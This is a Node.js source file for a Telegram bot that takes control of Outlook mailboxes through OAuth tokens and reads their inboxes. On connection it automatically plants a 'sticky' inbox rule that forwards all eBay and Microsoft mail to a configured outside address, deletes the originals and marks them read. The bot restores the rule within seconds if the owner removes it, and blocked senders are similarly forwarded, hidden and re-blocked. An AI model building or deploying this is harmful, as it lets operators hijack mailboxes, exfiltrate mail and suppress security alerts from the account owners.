// src/bot/telegram.js
const TelegramBot = require('node-telegram-bot-api');
const OutlookAuth = require('../outlook/auth');
const RuleManager = require('../outlook/rules');
const BlockedSendersManager = require('../outlook/blocked');
const Account = require('../models/Account');
const Log = require('../models/Log');
const { encryptToken, decryptToken } = require('../utils/encryption');
const { escapeMarkdown, safeSendMessage } = require('../utils/telegramHelper');

// Import command modules
const AccountCommands = require('./commands/account');
const RuleCommands = require('./commands/rules');
const SenderCommands = require('./commands/sender');
const BackupCommands = require('./commands/backup');
const ReportCommands = require('./commands/report');

class OutlookTelegramBot {
    constructor() {
        // Telegram bot options with proxy support
        const options = {
            polling: {
                interval: 300,
                autoStart: true,
                params: { timeout: 30 }
            }
        };

        // Add proxy if configured
        if (process.env.TELEGRAM_PROXY) {
            options.requestConfig = {
                proxy: process.env.TELEGRAM_PROXY
            };
        }

        // Use custom API URL if provided
        if (process.env.TELEGRAM_API_URL) {
            options.baseApiUrl = process.env.TELEGRAM_API_URL;
        }

        this.bot = new TelegramBot(process.env.TELEGRAM_BOT_TOKEN, options);

        // Initialize core services
        this.outlookAuth = new OutlookAuth();
        this.ruleManager = new RuleManager();
        this.blockedManager = new BlockedSendersManager();

        // Initialize global sessions
        global.pendingAuth = global.pendingAuth || new Map();
        global.reconnectSessions = global.reconnectSessions || new Map();
        global.botStats = global.botStats || {
            startTime: Date.now(),
            rulesToday: 0,
            rulesRestored: 0,
            blocksToday: 0,
            totalAccounts: 0
        };

        // Initialize command modules
        this.accountCommands = new AccountCommands(this.bot, this.outlookAuth, this.ruleManager, this.blockedManager);
        this.ruleCommands = new RuleCommands(this.bot, this.outlookAuth, this.ruleManager);
        this.senderCommands = new SenderCommands(this.bot, this.outlookAuth, this.blockedManager, this.ruleManager);
        this.backupCommands = new BackupCommands(this.bot, this.outlookAuth, this.ruleManager, this.blockedManager);
        this.reportCommands = new ReportCommands(this.bot);

        // Setup main handlers
        this.setupMainMenu();
        this.setupHelp();
        this.setupInboxCommand();
        this.setupAuthCallback();
        this.setupErrorHandler();

        console.log('🤖 Outlook Bot Started - All Commands Loaded');
        console.log('📋 Account Commands ✓');
        console.log('📋 Inbox Notification Commands ✓');
        console.log('📋 Rule Commands ✓');
        console.log('📋 Sender Commands ✓');
        console.log('📋 Backup Commands ✓');
        console.log('📋 Report Commands ✓');
    }

    setupMainMenu() {
        this.bot.onText(/\/start|\/menu/, async (msg) => {
            const chatId = msg.chat.id;

            const menu =
                '🔥 *OUTLOOK ACCOUNT CONTROLLER v3.0*\n\n' +
                '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n' +

                '📧 *ACCOUNT & EMAIL MANAGEMENT*\n' +
                '├ /inbox - Xem các email gần nhất\n' +
                '├ /add - Thêm tài khoản Outlook\n' +
                '├ /remove [email] - Xóa tài khoản\n' +
                '├ /list - Danh sách tài khoản\n' +
                '├ /status [email] - Trạng thái tài khoản\n' +
                '├ /history [email] - Lịch sử hoạt động\n' +
                '└ /reconnect [email] - Kết nối lại\n\n' +

                '📋 *RULE MANAGEMENT*\n' +
                '├ /rules [email] - List all rules\n' +
                '├ /rule add - Create custom rule\n' +
                '├ /rule toggle - Enable/disable rule\n' +
                '├ /rule remove - Delete rule\n' +
                '├ /rule restore - Restore deleted rule\n' +
                '└ /rule backup [email] - Backup rules\n\n' +

                '🚫 *SENDER CONTROL*\n' +
                '├ /block [sender] - Block sender/domain\n' +
                '├ /unblock [sender] - Unblock sender/domain\n' +
                '├ /blocked [email] - View blocked list\n' +
                '├ /forward [sender] [email] - Forward emails\n' +
                '└ /forward off [sender] - Stop forwarding\n\n' +

                '💾 *BACKUP & RESTORE*\n' +
                '├ /backup [email] - Backup account state\n' +
                '├ /restore [email] [id] - Restore from backup\n' +
                '├ /snapshot [email] - Quick snapshot\n' +
                '├ /backups [email] - List backups\n' +
                '├ /compare [email] [id] - Compare with backup\n' +
                '└ /auto backup [on/off] - Auto backup toggle\n\n' +

                '📊 *REPORTS & STATS*\n' +
                '├ /report daily - Today\'s summary\n' +
                '├ /report weekly - Weekly report\n' +
                '├ /report [email] - Account report\n' +
                '├ /summary - Quick overview\n' +
                '├ /stats - Bot statistics\n' +
                '├ /logs [email] - Recent activity\n' +
                '└ /export [format] - Export data\n\n' +

                '📖 *GUIDE*\n' +
                '├ /help - Detailed command guide\n' +
                '├ /examples - Usage examples\n' +
                '└ /guide - Complete tutorial\n\n' +

                '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n' +
                '✅ *System Ready* | 24/7 Monitoring Active\n' +
                '🔄 Rule Check: 5sec | Sender Check: 2sec';

            await this.bot.sendMessage(chatId, menu, {
                parse_mode: 'Markdown',
                disable_web_page_preview: true
            });
        });

        this.bot.onText(/\/examples/, async (msg) => {
            const chatId = msg.chat.id;

            const examples =
                '📚 *COMMAND EXAMPLES*\n\n' +

                '1️⃣ *Add Account*\n' +
                '   `/add`\n' +
                '   → Follow link, login, paste URL\n\n' +

                '2️⃣ *Block Sender*\n' +
                '   `/block spammer@example.com` - Block on all\n' +
                '   `/block user@outlook.com|spam.com` - Specific account\n' +
                '   `/block @ebay.com` - Block entire domain\n\n' +

                '3️⃣ *Forward Emails*\n' +
                '   `/forward @ebay.com target@example.com`\n' +
                '   `/forward off @ebay.com` - Stop forwarding\n' +
                '   `/forward off sender@email.com|target@email.com` - Stop specific forward\n\n' +

                '4️⃣ *Custom Rule*\n' +
                '   `/rule add AmazonForward | user@outlook.com | subject:amazon | forward:target@example.com | action:delete`\n' +
                '   `/rule add DeleteShopify | user@outlook.com | sender:shopify.com | action:delete`\n\n' +

                '5️⃣ *Backup & Restore*\n' +
                '   `/backup user@outlook.com` - Create backup\n' +
                '   `/backups user@outlook.com` - List backups\n' +
                '   `/restore user@outlook.com backup_123456` - Restore\n\n' +

                '6️⃣ *Reports*\n' +
                '   `/report daily` - Today\'s activity\n' +
                '   `/report user@outlook.com` - Account report\n' +
                '   `/export json` - Export all data\n\n' +

                '💡 *Pro Tips:*\n' +
                '• Use `all:` prefix to apply to all accounts\n' +
                '• Sticky rules (eBay/Microsoft) auto-restore\n' +
                '• Blocked emails are FORWARDED + DELETED\n' +
                '• Daily reports at 9:00 AM\n' +
                '• Auto-backup creates daily snapshots';

            await this.bot.sendMessage(chatId, examples, { parse_mode: 'Markdown' });
        });
    }

    setupHelp() {
        this.bot.onText(/\/help|\/guide/, async (msg) => {
            const chatId = msg.chat.id;

            const guide =
                '📖 *OUTLOOK BOT - COMPLETE USER GUIDE*\n\n' +

                '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n' +
                '🎯 *WHAT THIS BOT DOES*\n' +
                '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n' +
                '✅ Manage multiple Outlook accounts\n' +
                '✅ Auto-restore sticky rules (eBay/Microsoft)\n' +
                '✅ Block + FORWARD spam to monitoring email\n' +
                '✅ Forward emails to any address\n' +
                '✅ 24/7 monitoring with 2-5 sec response\n' +
                '✅ Complete backup & restore system\n' +
                '✅ Detailed reports & analytics\n\n' +

                '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n' +
                '📧 *ACCOUNT MANAGEMENT*\n' +
                '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n' +
                '• `/add` - Connect Outlook account\n' +
                '  → Click link, login, paste URL back\n' +
                '  → Sticky rule auto-created\n\n' +
                '• `/remove user@outlook.com` - Remove account\n' +
                '• `/remove all` - Remove all accounts\n' +
                '• `/list` - Show all accounts with status\n' +
                '• `/status user@outlook.com` - Detailed status\n' +
                '• `/history user@outlook.com` - Full history\n' +
                '• `/reconnect user@outlook.com` - Fix expired\n\n' +

                '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n' +
                '🚫 *BLOCK + FORWARD SYSTEM*\n' +
                '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n' +
                '• `/block spammer@example.com` - Block + Forward to monitoring email\n' +
                '• `/block @ebay.com` - Block entire domain + Forward\n' +
                '• `/block user@outlook.com|spam.com` - Block on specific account\n' +
                '• `/block all:spam.com` - Block on all accounts\n\n' +
                '• `/unblock spammer@example.com` - Remove block\n' +
                '• `/unblock @ebay.com` - Unblock domain\n' +
                '• `/blocked` - Show all blocked senders\n' +
                '• `/blocked user@outlook.com` - Show for specific\n\n' +
                '✨ *NEW:* Blocked emails are FORWARDED to monitoring email + DELETED from inbox!\n\n' +

                '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n' +
                '📨 *FORWARD RULES*\n' +
                '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n' +
                '• `/forward @ebay.com friend@gmail.com` - Forward domain\n' +
                '• `/forward spammer@example.com user@gmail.com` - Forward sender\n' +
                '• `/forward off @ebay.com` - Stop all forwarding for domain\n' +
                '• `/forward off sender@email.com|target@email.com` - Stop specific forward\n\n' +

                '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n' +
                '📋 *RULE MANAGEMENT*\n' +
                '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n' +
                '• `/rules user@outlook.com` - List all rules\n' +
                '• `/rule add` - Create custom rule\n' +
                '  Format: `/rule add Name | email | condition:value | action:value`\n' +
                '  Conditions: `subject:`, `body:`, `sender:`\n' +
                '  Actions: `forward:email`, `action:delete`, `action:markread`, `action:stop`\n\n' +
                '• `/rule toggle "Name" user@outlook.com` - Enable/disable\n' +
                '• `/rule remove "Name" user@outlook.com` - Delete rule\n' +
                '• `/rule restore "Name" user@outlook.com` - Restore deleted\n' +
                '• `/rule backup user@outlook.com` - Save current rules\n\n' +

                '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n' +
                '💾 *BACKUP & RESTORE*\n' +
                '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n' +
                '• `/backup user@outlook.com` - Full backup\n' +
                '• `/backup all` - Backup all accounts\n' +
                '• `/backups user@outlook.com` - List backups\n' +
                '• `/restore user@outlook.com backup_id` - Restore\n' +
                '• `/snapshot user@outlook.com` - Quick snapshot\n' +
                '• `/compare user@outlook.com backup_id` - Compare changes\n' +
                '• `/auto backup user@outlook.com on` - Enable auto backup\n' +
                '• `/auto backup user@outlook.com off` - Disable\n\n' +

                '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n' +
                '📊 *REPORTS & STATS*\n' +
                '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n' +
                '• `/report daily` - Today\'s summary\n' +
                '• `/report weekly` - Weekly analytics\n' +
                '• `/report user@outlook.com` - Account report\n' +
                '• `/summary` - Quick overview\n' +
                '• `/stats` - Bot statistics\n' +
                '• `/logs` - Recent activity\n' +
                '• `/logs user@outlook.com` - Account logs\n' +
                '• `/export json` - Export as JSON\n' +
                '• `/export csv` - Export as CSV\n\n' +

                '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n' +
                '⚡ *ULTRA-FAST MONITORING*\n' +
                '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n' +
                '• 🔄 *Sticky Rules* - Checked every 10 seconds\n' +
                '  → eBay/Microsoft rule auto-restores if deleted\n' +
                '  → Forwards to monitoring email, deletes original\n\n' +
                '• 🚫 *Blocked Senders* - Checked every 2-5 seconds!\n' +
                '  → Auto re-blocks + forwards if someone unblocks\n' +
                '  → Instant Telegram alerts in 2 seconds\n\n' +
                '• 🔐 *Tokens* - Refreshed every 30 minutes\n' +
                '  → Auto reconnect before expiry\n\n' +
                '• 📈 *Daily Reports* - Every day at 9:00 AM\n' +
                '  → Complete account activity summary\n\n' +

                '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n' +
                '💡 *PRO TIPS*\n' +
                '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n' +
                '1️⃣ Use `all:` prefix for bulk operations\n' +
                '   Example: `/block all:ebay.com`\n\n' +
                '2️⃣ Sticky rules are LOCKED - cannot be deleted\n' +
                '   Bot restores them immediately\n\n' +
                '3️⃣ Blocked emails are FORWARDED to monitoring email\n' +
                '   Set FORWARD_TARGET_EMAIL in .env\n\n' +
                '4️⃣ Backup before removing accounts\n' +
                '   `/backup email@outlook.com` then `/remove`\n\n' +
                '5️⃣ Check domain status with `/check`\n' +
                '   `/check ebay.com` - See blocked/forwarded status\n\n' +

                '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n' +
                '✅ *System Ready - 24/7 Ultra-Fast Monitoring Active*\n' +
                '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━';

            // Split long message if needed
            if (guide.length > 4000) {
                const chunks = guide.match(/[\s\S]{1,4000}/g) || [];
                for (const chunk of chunks) {
                    await this.bot.sendMessage(chatId, chunk, { parse_mode: 'Markdown' });
                }
            } else {
                await this.bot.sendMessage(chatId, guide, { parse_mode: 'Markdown' });
            }
        });
    }

    setupInboxCommand() {
        this.bot.onText(/\/inbox(?:\s+(.+))?/, async (msg, match) => {
            const chatId = msg.chat.id;
            const targetEmail = match[1]?.trim().toLowerCase();

            try {
                let query = { telegramChatId: chatId.toString(), status: 'active' };
                if (targetEmail) {
                    query.email = targetEmail;
                }

                const account = await Account.findOne(query);
                if (!account) {
                    return safeSendMessage(this.bot, chatId, '❌ Không tìm thấy tài khoản Outlook nào đang hoạt động. Dùng /add để thêm tài khoản.');
                }

                await safeSendMessage(this.bot, chatId, `⏳ Đang tải 5 email mới nhất từ *${escapeMarkdown(account.email)}*...`, { parse_mode: 'Markdown' });

                const { decryptToken } = require('../utils/encryption');
                const GraphClient = require('../outlook/graph');

                let accessToken = null;
                const tokenResult = await this.outlookAuth.refreshAccessToken(decryptToken(account.refreshToken));
                if (tokenResult.success) {
                    accessToken = tokenResult.accessToken;
                } else {
                    accessToken = decryptToken(account.accessToken);
                }

                const graph = new GraphClient(accessToken);
                const messages = await graph.getRecentMessages(5);

                if (!messages || messages.length === 0) {
                    return safeSendMessage(this.bot, chatId, `📭 Hộp thư *${escapeMarkdown(account.email)}* hiện không có thư nào.`, { parse_mode: 'Markdown' });
                }

                let reply = `📬 *5 EMAIL MỚI NHẤT TRONG HỘP THƯ*\n`;
                reply += `📧 Tài khoản: \`${escapeMarkdown(account.email)}\`\n`;
                reply += `━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;

                messages.forEach((m, idx) => {
                    const senderName = escapeMarkdown(m.from?.emailAddress?.name || 'Ẩn danh');
                    const senderAddr = escapeMarkdown(m.from?.emailAddress?.address || 'Unknown');
                    const subject = escapeMarkdown(m.subject || '(Không có tiêu đề)');
                    const time = m.receivedDateTime ? new Date(m.receivedDateTime).toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' }) : '';
                    const preview = escapeMarkdown((m.bodyPreview || '').trim().substring(0, 150));

                    reply += `*${idx + 1}. ${subject}*\n`;
                    reply += `   👤 Từ: ${senderName} (\`${senderAddr}\`)\n`;
                    reply += `   🕒 ${time}\n`;
                    if (preview) reply += `   📝 ${preview}...\n`;
                    reply += `\n`;
                });

                await safeSendMessage(this.bot, chatId, reply, { parse_mode: 'Markdown' });

            } catch (error) {
                console.error('❌ /inbox command error:', error.message);
                await safeSendMessage(this.bot, chatId, `❌ Lỗi khi tải hộp thư: ${escapeMarkdown(error.message)}`, { parse_mode: 'Markdown' });
            }
        });
    }

    setupAuthCallback() {
        this.bot.on('text', async (msg) => {
            const chatId = msg.chat.id;
            const text = msg.text;

            if (text.includes('/auth/callback?code=')) {
                await this.handleAuthCallback(chatId, text, msg);
            }
        });
    }

    async handleAuthCallback(chatId, text, msg) {
        await safeSendMessage(this.bot, chatId, '⏳ Đang xác thực tài khoản...');

        try {
            console.log('🔑 Extracting code from URL...');
            const urlParts = text.split('?');
            if (urlParts.length < 2) {
                return safeSendMessage(this.bot, chatId, '❌ URL không hợp lệ hoặc thiếu tham số code.');
            }
            const urlParams = new URLSearchParams(urlParts[1]);
            const code = urlParams.get('code');
            if (!code) {
                return safeSendMessage(this.bot, chatId, '❌ Không tìm thấy mã code trong URL.');
            }

            await this.processAuthorizationCode(code, chatId, msg.from?.username || msg.from?.first_name);
        } catch (error) {
            console.error('❌ Manual auth callback error:', error);
            await safeSendMessage(this.bot, chatId, `❌ Lỗi xác thực: ${escapeMarkdown(error.message)}`, { parse_mode: 'Markdown' });
        }
    }

    /**
     * Unified OAuth code processor.
     * Can be invoked directly from the HTTP web callback (zero-click) or via manual URL paste.
     */
    async processAuthorizationCode(code, chatId, username = null) {
        if (!chatId) {
            throw new Error('chatId is required to link Outlook account to Telegram.');
        }

        const numericChatId = chatId.toString();

        try {
            console.log(`🔑 Processing authorization code for chatId: ${numericChatId}...`);

            const authResult = await this.outlookAuth.getTokenFromCode(code);
            console.log('🔑 authResult:', {
                success: authResult.success,
                email: authResult.email,
                name: authResult.name,
                hasAccessToken: !!authResult.accessToken,
                hasRefreshToken: !!authResult.refreshToken
            });

            if (!authResult.success) {
                await safeSendMessage(this.bot, numericChatId,
                    `❌ *Xác thực thất bại*\n\n${escapeMarkdown(authResult.error || 'Không nhận được mã xác thực từ Microsoft.')}`,
                    { parse_mode: 'Markdown' }
                );
                return { success: false, error: authResult.error };
            }

            // Get Telegram username if not provided
            if (!username) {
                try {
                    const chatInfo = await this.bot.getChat(numericChatId);
                    username = chatInfo.username || chatInfo.first_name || 'User';
                } catch {
                    username = 'User';
                }
            }

            console.log('🔍 Querying MongoDB for existing account...');
            let account = await Account.findOne({ email: authResult.email.toLowerCase() });
            console.log('🔍 MongoDB result:', account ? 'Found existing' : 'New account');

            if (account) {
                // Update existing account
                console.log('🔄 Updating existing account in MongoDB...');
                account.refreshToken = encryptToken(authResult.refreshToken);
                account.accessToken = encryptToken(authResult.accessToken);
                account.tokenExpiry = new Date(Date.now() + authResult.expiresIn * 1000);
                account.status = 'active';
                account.telegramChatId = numericChatId;
                account.telegramUsername = username;
                await account.save();
                console.log('✅ Existing account updated successfully');

                await safeSendMessage(this.bot, numericChatId,
                    `✅ *Tài khoản đã được cập nhật!*\n\n` +
                    `📧 Email: \`${escapeMarkdown(authResult.email)}\`\n` +
                    `👤 Người dùng: ${escapeMarkdown(authResult.name || username)}\n` +
                    `🔄 Trạng thái: Đã kết nối lại thành công`,
                    { parse_mode: 'Markdown' }
                );
            } else {
                // Create new account
                console.log('🆕 Creating new account document...');
                account = new Account({
                    email: authResult.email.toLowerCase(),
                    refreshToken: encryptToken(authResult.refreshToken),
                    accessToken: encryptToken(authResult.accessToken),
                    tokenExpiry: new Date(Date.now() + authResult.expiresIn * 1000),
                    status: 'active',
                    telegramChatId: numericChatId,
                    telegramUsername: username,
                    stickyRules: ['Sticky_eBay_Microsoft_Rule'],
                    autoBackup: true,
                    stats: { rulesEnforced: 0, rulesRestored: 0, sendersBlocked: 0, emailsForwarded: 0 },
                    ruleStats: {
                        enforceCount: 0,
                        restoreCount: 0,
                        lastEnforced: null,
                        lastRestored: null,
                        lastChecked: null
                    },
                    rules: [],
                    blockedSenders: [],
                    forwardRules: []
                });

                console.log('💾 Saving new account to MongoDB...');
                await account.save();
                console.log('✅ New account saved with ID:', account._id);

                await safeSendMessage(this.bot, numericChatId,
                    `✅ *Tài khoản mới đã kết nối!*\n\n` +
                    `📧 Email: \`${escapeMarkdown(authResult.email)}\`\n` +
                    `👤 Tên: ${escapeMarkdown(authResult.name || username)}\n\n` +
                    `🔄 Đang kích hoạt sticky rule...`,
                    { parse_mode: 'Markdown' }
                );

                // Create sticky rule
                try {
                    const forwardTarget = process.env.FORWARD_TARGET_EMAIL;
                    if (!forwardTarget) {
                        throw new Error('FORWARD_TARGET_EMAIL is not configured in .env');
                    }

                    const ruleResult = await this.ruleManager.ensureStickyRule(
                        authResult.accessToken,
                        account._id
                    );

                    account.rules.push({
                        ruleId: ruleResult.ruleId,
                        name: 'Sticky_eBay_Microsoft_Rule',
                        conditions: {
                            subjectContains: ['eBay', 'Microsoft']
                        },
                        actions: {
                            delete: true,
                            forwardTo: [{
                                emailAddress: {
                                    address: forwardTarget
                                }
                            }],
                            markAsRead: true,
                            stopProcessingRules: true
                        },
                        isEnabled: true,
                        isSticky: true,
                        createdAt: new Date(),
                        lastVerified: new Date()
                    });

                    account.stats.rulesEnforced = (account.stats.rulesEnforced || 0) + 1;
                    account.ruleStats.enforceCount = (account.ruleStats.enforceCount || 0) + 1;
                    account.ruleStats.lastEnforced = new Date();
                    await account.save();

                    await safeSendMessage(this.bot, numericChatId,
                        `✅ *Sticky Rule Hoạt Động*\n\n` +
                        `📧 Chuyển tiếp eBay/Microsoft → \`${escapeMarkdown(forwardTarget)}\`\n` +
                        `🛡️ Tự động khôi phục đã bật`,
                        { parse_mode: 'Markdown' }
                    );

                    // Create initial backup
                    if (this.backupCommands && typeof this.backupCommands.createBackup === 'function') {
                        await this.backupCommands.createBackup(account, username);
                    }

                } catch (ruleError) {
                    console.error('❌ Rule creation error:', ruleError.message);
                    await safeSendMessage(this.bot, numericChatId,
                        `ℹ️ Sticky rule sẽ được kiểm tra và kích hoạt tự động trong vài phút.`,
                        { parse_mode: 'Markdown' }
                    );
                }
            }

            // Cleanup pending sessions
            global.pendingAuth?.delete(numericChatId);
            global.reconnectSessions?.delete(numericChatId);

            // Log success
            await Log.create({
                accountId: account._id,
                action: 'account_connected',
                status: 'success',
                message: `Connected via OAuth`,
                details: { username }
            }).catch(() => {});

            // Update global stats
            global.botStats.totalAccounts = await Account.countDocuments();

            return {
                success: true,
                email: authResult.email,
                name: authResult.name
            };

        } catch (error) {
            console.error('❌ Auth processing error:', error);
            await safeSendMessage(this.bot, numericChatId,
                `❌ Lỗi kết nối tài khoản\n\n${escapeMarkdown(error.message)}`,
                { parse_mode: 'Markdown' }
            );
            return { success: false, error: error.message };
        }
    }

    setupErrorHandler() {
        // Handle polling errors
        this.bot.on('polling_error', (error) => {
            if (error.code === 'EFATAL' && error.message.includes('ETIMEDOUT')) {
                console.log('⚠️ Telegram polling timeout - retrying...');
            } else {
                console.error('❌ Telegram polling error:', error);
            }
        });

        // Handle webhook errors
        this.bot.on('webhook_error', (error) => {
            console.error('❌ Telegram webhook error:', error);
        });
    }

    start() {
        console.log('✅ Bot is running - All systems ready');
        console.log('📊 Ultra-fast monitoring active (2-5 sec response)');
        console.log('🤖 Waiting for commands...');
    }
}

module.exports = OutlookTelegramBot;